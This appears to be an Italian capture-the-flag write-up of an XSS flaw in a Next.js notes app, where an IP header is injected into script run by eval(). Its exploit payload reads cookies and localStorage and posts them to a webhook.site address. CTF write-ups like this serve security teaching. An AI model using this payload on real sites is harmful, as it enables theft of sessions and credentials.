Analisi della Vulnerabilità

La challenge presenta una vulnerabilità XSS (Cross-Site Scripting) che può essere sfruttata per rubare la FLAG.

Componenti Principali:

  • Un'app Next.js per la gestione di note
  • Un bot che visita gli URL inviati dagli utenti
  • Il bot si autentica usando la FLAG come password

Vulnerabilità identificata:

Nel file app/note/[id]/page.jsx, è presente un codice vulnerabile:


<script>{`
fetch("/api/track", {
  method: "GET",
  cache: "no-store",
  headers: {
      "x-user-ip": "${userIP}",
  },
})
  .then(async (res) => {
      if (res.ok) {
          eval(await res.text());
      }
  })
  .catch((error) => {
      console.error(error);
  });
`}</script>

Questo codice è vulnerabile perché:

  1. Prende l'IP dell'utente dall'header x-real-ip
  2. Lo passa in una richiesta a /api/track
  3. La risposta viene eseguita con eval()

In pages/api/track.js, la stringa dell'IP viene inserita direttamente nel JavaScript:


const jsContent = `
$(document).ready(function() {
    const userDetails = {
        ip: "${userIp}",
        // ...
    };
    // ...
});`

Strategia di Exploit

1. Creare una nota con contenuto normale

Iniziamo creando una nota standard per ottenere un ID valido.

2. Accedere alla nota con un header IP modificato

Sfruttiamo la vulnerabilità XSS iniettando codice JavaScript nell'header x-user-ip.

Payload utilizzato:


fetch("/api/auth", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username: "test", password: document.cookie })
})
.then(r => r.json())
.then(data => {
  fetch("https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cookie: document.cookie, localStorage: localStorage.getItem("isAuthenticated") })
  });
});

3. Inviare l'URL della nota al bot

Il bot visita la nota e attiva il nostro payload XSS.

4. Il payload ruba la password e la invia al webhook

Il codice JavaScript iniettato estrae la FLAG dai cookie e la invia al webhook specificato.
